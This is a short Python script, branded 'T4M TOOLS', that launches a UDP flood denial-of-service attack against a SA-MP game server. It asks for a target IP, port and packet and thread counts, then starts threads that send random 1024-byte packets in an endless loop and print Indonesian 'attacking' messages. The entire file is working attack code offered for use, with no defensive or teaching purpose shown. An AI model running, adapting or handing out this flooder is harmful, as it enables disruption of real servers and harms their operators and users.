# SXMP - A UDP-Flood script that made on purpose.
# Launches a attack to the SAMP connection client.
import random
import socket
import threading
print("""
----------------- WELCOME TO T4M TOOLS ------------------        
                                               
                                               
    T4M - DDoS Attacks - UDP FLOOD
    Author : T4M
""")

ip = str(input("> IP : "))
port = int(input(">  Port : "))
times = int(input("> Connection packets : "))
threads = int(input("> Packets : "))

# Attack
def sxmp():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f"T4M >> Menyerang {ip} Dan Mengirim Paket {port}")
		except:
			print(f"T4M >> Menyerang {ip} Dan Mengirim Paket {port}")

# Threads
for y in range(threads):
	th = threading.Thread(target = sxmp)
	th.start()
